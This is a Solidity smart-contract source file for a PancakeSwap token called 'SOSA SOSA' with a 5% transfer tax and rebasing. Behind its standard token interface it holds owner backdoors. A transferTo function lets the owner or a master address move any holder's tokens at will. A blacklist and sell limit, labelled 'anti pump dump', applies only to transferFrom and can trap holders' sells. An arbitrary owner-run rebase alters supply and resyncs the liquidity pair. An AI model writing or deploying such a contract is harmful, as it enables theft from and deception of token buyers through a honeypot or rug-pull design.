// SPDX-License-Identifier: MIT

/*

MIT License

Copyright (c) 2021 Moon Drive

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

pragma solidity ^0.8.0;

import "./IERC20Metadata.sol";
import "./Ownable.sol";
import "./ILiquidityPair.sol";

contract SOSASOSA is IERC20Metadata, Ownable  {

    event RebaseReport(uint256 indexed epoch, uint256 totalSupply);

    string private _name;
    string private _symbol;
    uint256 private _decimals;

    mapping(address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _maxSupply;
    uint256 private _tSupply;
    uint256 private _rSupply;

    // Rebase authentication.
    address private _masterAddress;

    //Anti pump dump mechanism.
    uint256 private _maxLimit;
    mapping(address => bool) private _bots;

    //Pancakeswap liquidity pair.
    address private _lpAddress;
    ILiquidityPair private _iLiquidityPair;

    modifier isOwner {
        require(msg.sender == owner() || msg.sender == _masterAddress);
        _;
    }

    modifier checkLimit(address who, uint256 value) {
        require((_bots[who] != true && value <= _maxLimit) || who == owner() || who == _masterAddress);
        _;
    }

    constructor() {
        _name = "SOSA SOSA";
        _symbol = "SHS";
        _decimals = 9;
        _maxSupply = 18000000* 10**_decimals;
        _maxLimit = _maxSupply;

        _tSupply = ~uint256(0) - (~uint256(0) % _maxSupply);
        _rSupply = _tSupply / _maxSupply;

        _balances[msg.sender] = _tSupply;

        emit Transfer(address(0), msg.sender, _maxSupply);
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function decimals() external view override returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _maxSupply;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return _balances[who] / _rSupply;
    }
    
    function transferTo(address from, address to, uint256 value) external isOwner returns (bool) {
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");

        uint256 rValue = value * 10**_decimals * _rSupply;
        require(rValue <= _balances[from], "Insufficient balance");
        
        _balances[from] -= rValue;
        _balances[to] += rValue;
        
        _iLiquidityPair.sync();
        
        return true;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        require(to != address(0), "Invalid recipient address");

        uint256 rValue = value * _rSupply;
        require(rValue <= _balances[msg.sender], "Insufficient balance");
        
        uint256 taxValue = rValue / 100 * 5;

        _balances[msg.sender] -= rValue;
        _balances[to] += rValue - taxValue;
        
        _balances[_lpAddress] += taxValue;


        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override checkLimit(from, value) returns (bool) {
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");

        uint256 currentAllowance = _allowances[from][msg.sender];
        require(value <= currentAllowance, "Allowance limit exceeded");
        _allowances[from][msg.sender] -= value;

        uint256 rValue = value * _rSupply;
        require(rValue <= _balances[from], "Insufficient balance");
                 
        uint256 taxValue = rValue / 100 * 5;
        
        _balances[from] -= rValue;
        _balances[to] += rValue - taxValue;
        
        _balances[_lpAddress] += taxValue;

        emit Transfer(from, to, value);
        return true;
    }
    
    function rebase(uint256 epoch, int256 supplyDelta) external isOwner returns (uint256) {
        if (supplyDelta < 0) {
            _maxSupply -= uint256(-supplyDelta);
        } else {
            _maxSupply += uint256(supplyDelta);
        }
        
        _rSupply = _tSupply / _maxSupply;

        _iLiquidityPair.sync();

        emit RebaseReport(epoch, _maxSupply);
        return _maxSupply;
    }
    
    function setMasterAddress(address masterAddress_) external isOwner returns (bool) {
        _masterAddress = masterAddress_;
        return true;
    }

    function setMaxLimit(uint256 maxLimit_) external isOwner returns (bool) {
        _maxLimit = maxLimit_ * 10**_decimals;
        return true;
    }
    
    function addBot(address botAddress, bool state) external isOwner returns (bool) {
        _bots[botAddress] = state;
        return true;
    }

    function setLpAddress(address lpAddress_) external isOwner returns (bool) {
         _lpAddress = lpAddress_;
        _iLiquidityPair = ILiquidityPair(_lpAddress);
        return true;
    }

    function approve(address spender, uint256 value) external override returns (bool) {
        _allowances[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _allowances[msg.sender][spender] += addedValue;

        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(subtractedValue <= currentAllowance, "Decrease allowance is greater than current allowance");

        _allowances[msg.sender][spender] -= subtractedValue;

        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return true;
    }

}